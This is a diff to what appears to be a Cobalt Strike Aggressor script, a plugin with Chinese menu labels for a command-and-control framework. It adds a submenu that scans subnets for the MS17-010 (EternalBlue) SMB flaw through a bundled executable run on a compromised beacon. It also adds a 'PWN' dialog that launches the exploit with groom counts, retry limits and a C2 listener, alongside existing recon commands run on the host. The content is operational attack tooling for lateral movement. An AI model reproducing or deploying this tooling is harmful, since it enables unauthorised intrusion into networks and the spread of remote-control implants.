@@ -7,7 +7,9 @@ sub recentqueryfunc{
     bshell($bid, "openfilehistory.exe $3['username']");
     #brm($bid,"openfilehistory.exe");
 }
-
+sub MS17-010-Scan{
+        bexecute_assembly($bid, script_resource("bin/Privilege_escalation/MS17-010/Cscan.exe"), $3["IP"]." MS17010");
+}
 menu "扫描分析"{
     item "杀毒检测-进程对比"{
         foreach $id ($1){
@@ -73,6 +75,26 @@ menu "扫描分析"{
     item "查询.net兼容版本"{
         $bid = $1;
         bshell($bid,"reg query \"HKLM\\Software\\Microsoft\\NET Framework Setup\\NDP\" /s /v version | findstr /i version | sort /+26 /r")
+    }
+    menu "MS17-010" {
+        item "MS17-010 Scan" {
+            $bid = $1;
+            $dialog = dialog("MS17-010 Scan",%(bid => $bid),&MS17-010-Scan);
+            dialog_description($dialog, "MS17-010 Scan,IP: [ip ip/24 ip/26 ip/8]");
+            drow_text($dialog, "IP",  "IP");
+            dbutton_action($dialog, "GO!");
+            dialog_show($dialog);
+        }
+        item "MS17-010 PWN"{
+            $bid = $1;
+            $dialog = dialog("MS17-010", %(ip => "192.168.1.1", grooms => "12", max_attempts => "5", bid => $bid, listener => 'listener'), &ms17_010);
+            drow_text($dialog, "ip",  "IP: "); 	
+            drow_listener($dialog, "listener", "Listener: ");
+            drow_text($dialog, "grooms",  "Grooms: ");
+            drow_text($dialog, "max_attempts",  "Attemps: ");
+            dbutton_action($dialog, "Go");
+            dialog_show($dialog);
+        }
     }
     # menu "Ladon"{
     #     item "加载Ladon"{
